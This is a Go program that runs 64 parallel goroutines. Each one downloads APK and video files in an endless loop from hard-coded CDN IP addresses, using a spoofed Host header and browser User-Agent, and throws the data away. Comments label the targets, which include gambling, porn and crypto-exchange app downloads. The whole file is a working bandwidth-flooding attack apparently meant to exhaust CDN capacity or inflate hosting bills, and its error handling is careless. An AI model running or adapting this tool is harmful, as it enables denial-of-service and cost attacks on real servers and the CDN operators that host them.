package main

import (
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"time"
)

const (
	URL       = "http://120.232.206.70/semaoAV_release_08-29_2.7.apk"                        //原ip地址   https://cdndownload.awnnyye.cn/semaoAV_release_08-29_2.7.apk
	URL2      = "http://[2409:8c20:4a22:10c::ff60]/semaoAV_release_08-29_2.7.apk"            //不是dns返回的 华为云cdn ip
	URL3      = "http://23.251.127.185/semaoAV_release_08-29_2.7.apk"                        //不选择海外加速的 华为云 自主ip
	URL4      = "http://184.25.232.135/semaoAV_release_08-29_2.7.apk"                        // akamai cdn ip 测试
	URL5      = "http://120.232.206.70/common/2022/www/bgvideo.mp4"                          //人人影视
	URL6      = "http://47.74.80.171/amxpj83.apk"                                            //赌博app
	URL7      = "http://139.155.239.18/files/package/Ygame_533_124801_0823214308_0.apk"      //亚博体育app  ip:49.51.42.62
	URL8      = "https://download.f30c4.com/files/package/Ygame_533_124801_0823214308_0.apk" //亚博体育app  ip:49.51.42.62
	URL9      = "http://47.107.10.248/upgradeapp/okx-android.apk"                            // okx https://okg-pub-hk.oss-accelerate.aliyuncs.com/upgradeapp/okx-android.apk   240b:4001:f00::2c1
	xiancheng = 64
)

func main() {

	/*	for true {
		download()
	} */
	for thread := 0; thread < xiancheng; thread++ {
		go download2()
	}
	time.Sleep(time.Duration(3000) * time.Minute)

}
func download() {

	for true {
		resp, err := http.Get("https://cdndownload.skoumde.cn/semaoAV_release_08-15_2.5.apk")
		//resp, err := http.Get("http://cdn.rr.tv/common/2022/www/bgvideo.mp4")
		if err != nil {

		}

		defer resp.Body.Close()

		io.Copy(ioutil.Discard, resp.Body)
	}
}

func download2() {
	for true {
		client := &http.Client{}
		req, err := http.NewRequest("GET", URL2, nil)
		if err != nil {
			log.Fatalln(err)
		}
		req.Header.Set("User-Agent", "GolangSpider/1.0")
		req.Host = "cdndownload.awnnyye.cn"
		//req.Host = "cocos-empty.oss-accelerate.aliyuncs.com"
		//req.Host = "download.f30c4.com"
		//req.Host = "okg-pub-hk.oss-accelerate.aliyuncs.com"
		req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
		req.Header.Add("Accept-Charset", "utf-8")
		req.Header.Add("Accept-Language", "zh-cn")
		req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36")

		// req.Host = "cdn.rr.tv"
		resp, err := client.Do(req)
		if err != nil {

		}
		defer resp.Body.Close()
		io.Copy(ioutil.Discard, resp.Body)
	}

}
